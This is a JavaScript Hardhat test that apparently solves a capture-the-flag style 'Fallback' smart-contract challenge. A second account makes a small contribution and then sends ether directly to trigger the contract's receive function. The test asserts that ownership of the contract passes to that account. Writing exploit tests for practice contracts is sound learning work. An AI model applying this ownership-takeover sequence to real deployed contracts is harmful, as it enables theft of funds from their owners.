const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("FallOut", function () {
  async function deployOneYearLockFixture() {
    const [owner, otherAccount] = await ethers.getSigners();

    const FallBack = await ethers.getContractFactory("Fallback");
    const fallBack = await FallBack.deploy();
    await fallBack.deployed();

    return { fallBack, owner, otherAccount };
  }

  describe("Deployment", function () {
    it("Should Become The OWNER", async function () {
      const { fallBack, owner, otherAccount } = await loadFixture(
        deployOneYearLockFixture
      );
      const Owner = await fallBack.owner();
      expect(Owner).to.equal(owner.address);
      const connectedAccount = fallBack.connect(otherAccount);
      await connectedAccount.contribute({
        value: ethers.utils.parseEther("0.0001"),
      });
      // Send,Transfer,Call are in solidity
      // sendTransaction is in etherjs

      // Receive Function Will Trigger & make otherAccount as Owner
      await otherAccount.sendTransaction({
        to: fallBack.address,
        value: ethers.utils.parseEther("1.0"), // Sends exactly 1.0 ether
      });
      const NewOwner = await fallBack.owner();
      expect(NewOwner).to.equal(otherAccount.address);
    });
  });
});
